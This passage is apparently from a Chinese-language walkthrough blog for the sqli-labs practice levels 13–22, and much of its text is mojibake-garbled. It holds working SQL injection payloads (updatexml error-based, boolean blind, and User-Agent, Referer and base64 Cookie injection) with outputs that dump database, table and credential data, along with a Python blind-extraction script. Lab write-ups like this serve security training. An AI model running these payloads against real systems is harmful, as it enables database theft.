class="hljs-operator">=</span>&quot;users&quot;<br></code></pre></td></tr></table></figure><ul><li><code>updatexml(1,0x7e,3)</code> æ˜¯ä¸€ä¸ªMySQL XMLå¤„ç†å‡½æ•°ï¼Œä½†å¯ä»¥ç”¨äºæŠ¥é”™æ³¨å…¥ã€‚å‚æ•°1ï¼šXMLæ–‡æ¡£ï¼ˆè¿™é‡Œéšæ„å¡« <code>1</code>ï¼‰ã€‚å‚æ•°2ï¼šXPathè¡¨è¾¾å¼ï¼ˆ<code>0x7e</code> æ˜¯ <code>~</code> çš„åå…­è¿›åˆ¶ï¼Œç”¨äºè§¦å‘æŠ¥é”™ï¼‰ã€‚å‚æ•°3ï¼šæ›¿æ¢å€¼ï¼ˆè¿™é‡Œéšæ„å¡« <code>3</code>ï¼‰ã€‚</li><li><code>concat(0x7e, (...))</code>ï¼š<ul><li><code>concat()</code> ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ï¼Œ<code>0x7e</code>ï¼ˆ<code>~</code>ï¼‰ç”¨äºè§¦å‘æŠ¥é”™å›æ˜¾ã€‚</li></ul></li><li><code>select group_concat(user,password) from mysql.user where user = &#39;mituan&#39;</code>ï¼š<ul><li>å°è¯•æŸ¥è¯¢ <code>mysql.user</code> è¡¨ï¼ˆMySQLç³»ç»Ÿç”¨æˆ·è¡¨ï¼‰ï¼Œä½† <code>updatexml()</code> ä¸å…è®¸ç›´æ¥æŸ¥è¯¢éå¸¸é‡æ•°æ®ã€‚æ”¹ç”¨ <code>information_schema</code> ï¼ˆMySQLçš„ç³»ç»Ÿæ•°æ®åº“ï¼‰æŸ¥è¯¢æ•°æ®åº“ç»“æ„ï¼Œè€Œä¸æ˜¯ç›´æ¥æŸ¥ <code>mysql.user</code>ã€‚</li></ul></li><li>æŸ¥æ•°æ®åº“å â†’ <code>information_schema.schemata</code></li><li>æŸ¥è¡¨å â†’ <code>information_schema.tables</code></li><li>æŸ¥åˆ—å â†’ <code>information_schema.columns</code></li><li>æŸ¥æ•°æ® â†’ <code>select concat(id,username,password) from users</code></li></ul><h5 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h5><p>åˆ¤æ–­é•¿åº¦ï¼š</p><p>åˆ¤æ–­å½“å‰ä½¿ç”¨æ•°æ®åº“åå­—çš„é•¿åº¦æ˜¯å¦å¤§äº1ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a&#x27;) or length((database()))&gt;1 -- a<br></code></pre></td></tr></table></figure><p>1. </p><p>æšä¸¾å­—ç¬¦ï¼šaâ€) or ascii(substr((database()),1,1))&gt;1 â€“ a<br>æˆªå–å½“å‰ä½¿ç”¨æ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä¸ºäº†æ–¹ä¾¿è„šæœ¬çš„ç¼–å†™ï¼Œè¿™é‡Œå°†å­—ç¬¦è½¬æ¢ä¸ºASCLLå†åˆ¤æ–­ã€‚</p><p>åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCLLç æ˜¯å¦å¤§äº1ï¼Œç”¨æˆ·åè¾“å…¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">a&#x27;) or ascii(substr((database()),1,1))&gt;1 -- a<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä½¿ç”¨ç©·ä¸¾æ³•ï¼Œæšä¸¾è¯¥å­—ç¬¦çš„æ‰€æœ‰å¯èƒ½æ€§ï¼ˆå¯¹åº”çš„ASCLLç ä¸ºï¼š32~126ï¼‰ã€‚</p><p>çŒœä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦ä»¥åï¼Œå†ç”¨æ­¤æ–¹æ³•æšä¸¾å…¶ä½™å­—ç¬¦</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># ç½‘ç«™è·¯å¾„</span><br>url = <span class="hljs-string">&quot;http://sqli-labs:8080/Less-13/&quot;</span><br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦çš„payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">    (database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">    substr(</span><br><span class="hljs-string">        (database())</span><br><span class="hljs-string">    ,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># postè¯·æ±‚å‚æ•°</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># åˆ¤æ–­é•¿åº¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># ä¿®æ”¹è¯·æ±‚å‚æ•°</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># å‡ºç°æ­¤å†…å®¹ä¸ºç™»å½•æˆåŠŸ</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æµ‹è¯•æˆåŠŸï¼Œé•¿åº¦ä¸ºï¼š&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ­£åœ¨æµ‹è¯•é•¿åº¦ï¼š&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># æšä¸¾å­—ç¬¦</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æˆªå–</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># æšä¸¾å­—ç¬¦çš„æ¯ä¸€ç§å¯èƒ½æ€§</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç¬¬&#x27;</span>, l, <span class="hljs-string">&#x27;ä¸ªå­—ç¬¦æšä¸¾æˆåŠŸï¼š&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure><p>å…¶ä½™è„±åº“æ“ä½œå¯ä»¥å°†<code>(database())</code>ä¿®æ”¹æ›¿æ¢å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012509.png"></p><h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14-&quot;"></a>Less-14-<code>&quot;</code></h4><p>å’Œless-13ä¸€æ ·ï¼Œæ³¨å…¥ç‚¹æ”¹ä¸º<code>&quot;</code></p><h4 id="Less-15-â€˜-å¸ƒå°”ç›²æ³¨"><a href="#Less-15-â€˜-å¸ƒå°”ç›²æ³¨" class="headerlink" title="Less-15-â€˜-å¸ƒå°”ç›²æ³¨"></a>Less-15-â€˜-å¸ƒå°”ç›²æ³¨</h4><p>ä¸æ˜¾ç¤ºæ•°æ®åº“çš„æŠ¥é”™ä¿¡æ¯ï¼ŒæŠ¥é”™æ³¨å…¥æ— æ³•ä½¿ç”¨ï¼Œä¸ä¼šåŠ¨æ€è¿”å›æ•°æ®ï¼Œæ— æ³•ä½¿ç”¨è”åˆæ³¨å…¥ã€‚</p><p>æ³¨å…¥ç‚¹åˆ¤æ–­ï¼š</p><p><code>admin&#39; -- </code></p><p>è¿”å›ï¼š<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013661.png"></p><p><code>a&#39; or 1 -- a</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013095.png"></p><p><code>a&#39; or 0 -- a</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013815.png"></p><p>å¯ä»¥ç¡®å®šæ³¨å…¥ç‚¹ä¸ºå•å¼•å·å­—ç¬¦å‹</p><p>å¸ƒå°”ç›²æ³¨å‚è€ƒLess-13-æ–¹æ³•äºŒ</p><h4 id="Less-16-â€œ-å¸ƒå°”ç›²æ³¨"><a href="#Less-16-â€œ-å¸ƒå°”ç›²æ³¨" class="headerlink" title="Less-16-â€œ)-å¸ƒå°”ç›²æ³¨"></a>Less-16-â€œ)-å¸ƒå°”ç›²æ³¨</h4><p>åˆ¤æ–­æ³¨å…¥ç‚¹ä¸º<code>&quot;)</code>ï¼Œæ¥ä¸‹æ¥ä¾æ—§æ˜¯å¸ƒå°”ç›²æ³¨</p><h4 id="Less-17-â€˜-æŠ¥é”™æ³¨å…¥"><a href="#Less-17-â€˜-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-17-â€˜-æŠ¥é”™æ³¨å…¥"></a>Less-17-â€˜-æŠ¥é”™æ³¨å…¥</h4><p>è¿™ä¸€å…³åœ¨ç”¨æˆ·åå¤„è¾“å…¥çš„éƒ½æ²¡æœ‰å®é™…ä½œç”¨ï¼Œåªæœ‰è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·ååï¼Œä¼šè¿”å›<code>SUCCESSFULLY UPDATED YOUR PASSWORD</code>,æ‰€ä»¥æ³¨å…¥ç‚¹åº”è¯¥åœ¨å¯†ç å¤„ã€‚</p><p>è¾“å…¥ï¼šadmin&#x2F;aâ€™</p><p>è¿”å›æŠ¥é”™ï¼š</p><p><code>You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at  line 1</code></p><p>å­˜åœ¨å•å¼•å·æ³¨å…¥ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plain">#åˆ¤æ–­æŠ¥é”™æ¡ä»¶<br><br>a&#x27; and updatexml(1,0x7e,3) -- a<br><br>##è¿”å›ï¼šXPATH syntax error: &#x27;~&#x27;<br><br><br><br>#è„±åº“<br>##æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“å<br>##å¯ä»¥åˆ†æ®µæŸ¥è¯¢ï¼š<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a<br>###è¿”å›ï¼šXPATH syntax error: &#x27;~information_schema&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a<br>###è¿”å›ï¼šXPATH syntax error: &#x27;~challenges&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a<br>###è¿”å›ï¼šXPATH syntax error: &#x27;~security&#x27;<br><br>###ç›´æ¥æŸ¥è¯¢å½“å‰æ‰€åœ¨åº“<br>1&#x27; and updatexml(1,concat(0x7e,substr((database()),1,32)),3) -- a<br>è¿”å›ï¼šXPATH syntax error: &#x27;~security&#x27;<br><br><br>#æŸ¥è¯¢ security æ•°æ®åº“çš„æ‰€æœ‰è¡¨å<br>1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name)<br>from information_schema.tables<br>where table_schema=&quot;security&quot;)),3) -- a<br><br>##è¿”å›ï¼šXPATH syntax error: &#x27;~emails,referers,uagents,users&#x27;<br><br><br># æŸ¥è¯¢ users è¡¨çš„æ‰€æœ‰åˆ—å<br>1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name)<br>from information_schema.columns<br>where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)),3) -- a<br><br>##è¿”å›ï¼šXPATH syntax error: &#x27;~id,username,password&#x27;<br><br><br><br>#æŸ¥è¡¨ä¸­å†…å®¹ï¼ˆåˆ†æ®µæŸ¥è¯¢ï¼‰ï¼š<br><br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from security.users limit 0,1)),3) -- a<br>##è¿”å›ï¼šYou can&#x27;t specify target table &#x27;users&#x27; for update in FROM clause&quot;ä½ ä¸èƒ½åœ¨ FROM å­å¥ä¸­æŒ‡å®šç›®æ ‡è¡¨ &#x27;users&#x27; è¿›è¡Œæ›´æ–°&quot;<br><br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from (select * from users) as temp limit 0,1)),3) -- a<br>##è¿”å›ï¼šXPATH syntax error: &#x27;~1:Dumb:0&#x27;<br>1&#x27; and updatexml(1,concat(0x7e,(select concat(id,&#x27;:&#x27;,username,&#x27;:&#x27;,password) from (select * from users) as temp limit 1,1)),3) -- a<br>##è¿”å›ï¼šXPATH syntax error: &#x27;~2:Angelina:0&#x27;<br></code></pre></td></tr></table></figure><h4 id="Less-18-HTTPå¤´æ³¨å…¥"><a href="#Less-18-HTTPå¤´æ³¨å…¥" class="headerlink" title="Less-18-HTTPå¤´æ³¨å…¥"></a>Less-18-HTTPå¤´æ³¨å…¥</h4><p>User-Agent:æµè§ˆå™¨è¡¨æ˜è‡ªå·±çš„èº«ä»½ï¼ˆæ˜¯å“ªç§æµè§ˆå™¨ï¼‰</p><p>ï¼ˆç”±äºphpæ­å»ºçš„sqli-labsä¸­18å…³ä¿®æ”¹User Agentåæ²¡æœ‰ååº”ï¼Œæ‰€ä»¥è¿™ä¸€å…³åœ¨buuctfæ‰“ï¼‰</p><p>è¾“å…¥admin&#x2F;adminåï¼Œè¿”å›ï¼š</p><p><code>Your IP ADDRESS is: 10.244.166.11   Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</code></p><p>è€Œå¯¹ç”¨æˆ·åå’Œå¯†ç å¤„éƒ½æ²¡æœ‰å‡ºç°æŠ¥é”™ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹åº”è¯¥åœ¨User Agent,bpæŠ“åŒ…æ”¹ã€‚</p><p>æ¨æ–­uname å’Œ passwd å­—æ®µéƒ½è¿›è¡Œäº†å¼ºæ•ˆçš„è¿‡æ»¤ï¼Œæˆ‘ä»¬æ³¨å…¥æ­£ç¡®çš„ uname å’Œ passwd ä¹‹åå†æ³¨å…¥ã€‚æ­¤æ—¶å‘ç°å½“æ³¨å…¥å•å¼•å·é—­åˆæ—¶ï¼Œç½‘é¡µè¿”å›æŠ¥é”™ä¿¡æ¯ã€‚</p><p>User Agentï¼š<code>&#39;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013067.png"></p><p>æ³¨å…¥ 2 ä¸ªè¿ç»­çš„å•å¼•å·ï¼Œå‘ç°é—­åˆæˆåŠŸï¼Œç”±æ­¤å¯è§ 2 ä¸ªå•å¼•å·åˆ†åˆ«é—­åˆäº† 2 ä¾§çš„å•å¼•å·ã€‚</p><p>åœ¨æ³¨å…¥çš„ä¸¤ä¸ªå•å¼•å·ä¹‹é—´å¯ä»¥æ’å…¥å…¶ä»– Sql è¯­å¥ï¼Œ updatexml() æŠ¥é”™æ³¨å…¥è¯­å¥ã€‚æ³¨æ„ä½¿ç”¨å•å¼•å·é—­åˆä¸¤ä¾§çš„ Sql è¯­å¥æ—¶ï¼Œç›¸å½“äºæŠŠå®ƒåˆ†å‰²æˆäº† 2 éƒ¨åˆ†ï¼Œæ’å…¥ updatexml() æŠ¥é”™æ—¶è¦ç”¨ OR è¿›è¡Œè¿æ¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR updatexml(1,concat(&quot;!&quot;,database()),2) OR &#x27;</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013780.png"></p><p>è¡¨åï¼šâ€™ OR updatexml(1,concat(â€œ!â€,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; â€˜securityâ€™)),2) OR â€˜ </p><p>å­—æ®µåï¼š â€˜ OR updatexml(1,concat(â€œ!â€,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D; â€˜securityâ€™ AND table_name &#x3D; â€˜usersâ€™)),2) OR â€˜ </p><p>å­—æ®µå†…å®¹ï¼šâ€™ OR (updatexml(1,concat(â€˜!â€™,(SELECT concat_ws(â€˜:â€™,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR â€˜ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013911.png"></p><h4 id="Less-19-Referer-POST-æŠ¥é”™æ³¨å…¥"><a href="#Less-19-Referer-POST-æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-19-Referer POST æŠ¥é”™æ³¨å…¥"></a>Less-19-Referer POST æŠ¥é”™æ³¨å…¥</h4><p>å½“è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç åï¼Œè¿”å›ï¼š</p><p><code>Your IP ADDRESS is: 10.244.166.11   Your Referer is: http://e6eb7525-01ea-457a-b00c-6fffbc2de320.node5.buuoj.cn/Less-19/</code></p><p><strong>Referer</strong>æ˜¯ HTTP å¤´çš„ä¸€ä¸ªå­—æ®µï¼Œç”¨äºå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ã€‚</p><p>æ•°æ®åº“åï¼šReferer: â€˜ OR updatexml(1,concat(â€œ!â€,database()),2) OR â€˜ </p><p>è¡¨åï¼šReferer: â€˜ OR updatexml(1,concat(â€œ!â€,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema &#x3D; â€˜securityâ€™)),2) OR â€˜ </p><p>å­—æ®µåï¼šReferer: â€˜ OR updatexml(1,concat(â€œ!â€,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D; â€˜securityâ€™ AND table_name &#x3D; â€˜usersâ€™)),2) OR â€˜ </p><p>å­—æ®µå†…å®¹ï¼šReferer: â€˜ OR (updatexml(1,concat(â€˜!â€™,(SELECT concat_ws(â€˜:â€™,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR â€˜ </p><h4 id="Less-20-Cookie"><a href="#Less-20-Cookie" class="headerlink" title="Less-20-Cookie"></a>Less-20-Cookie</h4><p><strong>cookie</strong> æ˜¯ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡Œ Session è·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ã€‚æƒ³è¦å›åˆ°ç™»å½•é¡µé¢ï¼Œæˆ‘ä»¬éœ€è¦å…ˆæŠŠ cookie æ¸…é™¤æ‰ã€‚</p><p>é¦–å…ˆè¾“å…¥æ­£ç¡®çš„è´¦æˆ·å’Œå¯†ç æµ‹è¯•ï¼Œç”¨bpæŠ“åŒ…ï¼ŒæŠ“åˆ°ä¹‹åæ”¾è¡ŒPOSTå†æŠ“GETï¼Œæ­¤æ—¶GETä¸­ä¼šæœ‰cookieä¿¡æ¯</p><p>æ­¤æ—¶å°±å¯ä»¥åœ¨cookieå¤„è¿›è¡Œæµ‹è¯•æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013836.png"></p><p>é—­åˆ<br>ã€€Cookie: uname&#x3D;adminâ€™ </p><p>æŸ¥è¯¢åº“å<br>Cookie: uname&#x3D;adminâ€™ and updatexml(1,concat(1,database()),1) and â€˜</p><p>æŸ¥è¯¢è¡¨å<br>ã€€Cookie: uname&#x3D;adminâ€™ and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™securityâ€™)),1) and â€˜</p><p> æŸ¥è¯¢å­—æ®µ<br>ã€€Cookie: uname&#x3D;adminâ€™ and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;â€™securityâ€™ and table_name&#x3D;â€™usersâ€™)),1) and â€˜</p><p> æŸ¥è¯¢æ•°æ®<br>Cookie: uname&#x3D;adminâ€™ and updatexml(1,concat(1,(select group_concat(username,â€™<del>â€˜,password) from users)),1) and â€˜<br>Cookie: uname&#x3D;adminâ€™ and updatexml(1,concat(1,(select concat(username,â€™</del>â€˜,password) from users limit 0,1)),1) and â€˜</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013182.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014352.png"></p><h4 id="Less-21-Cookie-base64-â€˜"><a href="#Less-21-Cookie-base64-â€˜" class="headerlink" title="Less-21-Cookie-base64-â€˜)"></a>Less-21-Cookie-base64-â€˜)</h4><p>è¿™ä¸€å…³ä¸­çš„Cookieä¸­unameå‚æ•°çš„å€¼æ˜¯base64ç¼–ç çš„ã€‚</p><p>æŠ“åŒ…ä¹‹åï¼Œ<code>Cookie: uname=YWRtaW4%3D</code></p><p>æŠŠunameçš„å€¼ç²˜è´´åˆ°burpsuiteçš„decoder1ï¼ˆç¼–ç å·¥å…·ï¼‰æ¨¡å—ï¼Œå°è¯•è§£ç ï¼Œurl, html, base64ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆç»“æœæ˜¯admin%3D</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014872.png"></p><p>æŠŠadminâ€™æ”¾åˆ°decoderé‡Œé¢, ç¼–ç æˆbase64,é‡æ”¾å™¨å‘å›å»</p><p>ä»æŠ¥é”™å¯çŸ¥é—­åˆæ˜¯â€™)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014836.png"></p><p> è¿™å…³è¿˜æ˜¯å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥ï¼Œé™¤äº†<strong>æ¯æ¡payloadéƒ½è¦ç»è¿‡ä¸€æ¬¡base64ç¼–ç ï¼ˆå¦‚æœbase64ç¼–ç ç»“æœåŒ…å«ç­‰å·è¿˜è¦è¿›è¡Œurlç¼–ç ï¼‰ï¼Œå†ä½œä¸ºunameçš„å€¼å‘é€</strong>ï¼Œå…¶ä»–è¿˜æ˜¯å’ŒLess20ä¸€æ ·ã€‚</p><p>Cookie: uname&#x3D; YWRtaW4nKSM&#x3D;</p><p>adminâ€™)#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIDEsMiwzIw&#x3D;&#x3D;</p><p>â€˜) union select 1,2,3#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCksMiwzIw&#x3D;&#x3D;</p><p>â€˜) union select database(),2,3#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwyLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYSA9ICdzZWN1cml0eScj</p><p>â€˜) union select group_concat(table_name),2,3 from information_schema.tables where table_schema &#x3D; â€˜securityâ€™#</p><p>Cookie: uname&#x3D;JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMiwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyBBTkQgdGFibGVfbmFtZSA9ICd1c2Vycycj</p><p>â€˜) union select group_concat(column_name),2,3 from information_schema.columns where table_schema &#x3D; â€˜securityâ€™ and table_name &#x3D; â€˜usersâ€™#</p><p>Cookie: dW5hbWU9JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb25jYXQoIjoiLHVzZXJuYW1lLHBhc3N3b3JkKSksMiwzIEZST00gc2VjdXJpdHkudXNlcnMj</p><p>â€˜) union select group_concat(concat(â€œ:â€,username,password)),2,3 from security.users#</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014093.png"></p><h4 id="Less-22-Cookie-base64-â€œ"><a href="#Less-22-Cookie-base64-â€œ" class="headerlink" title="Less-22-Cookie-base64-â€œ"></a>Less-22-Cookie-base64-â€œ</h4><p>åŸç†å’Œä¸Šä¸€å…³ä¸€æ ·ä¸€æ ·çš„ï¼ˆæ³¨å…¥ç‚¹åœ¨cookieçš„unameå‚æ•°å€¼ï¼Œpayloadéœ€è¦base64ç¼–ç ï¼Œå¦‚æœç¼–ç åæœ‰ç­‰å·è¿˜éœ€è¦urlç¼–ç ï¼‰ï¼Œå°±æ˜¯é—­åˆæ¢æˆåŒå¼•å·äº†ã€‚</p><p>æ³¨å…¥ç‚¹å˜æˆâ€</p><p>Cookie: uname&#x3D; IiM&#x3D;</p><p>â€œ # </p><p>Cookie: uname&#x3D;YSIgdW5pb24gc2VsZWN0IDEsMiwzIw&#x3D;&#x3D;</p><p>aâ€ union select 1,2,3#</p><p>Cookie: uname&#x3D; IiB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSwyLDMj</p><p>â€œ union select database(),2,3#</p><p>Cookie: uname&#x3D; 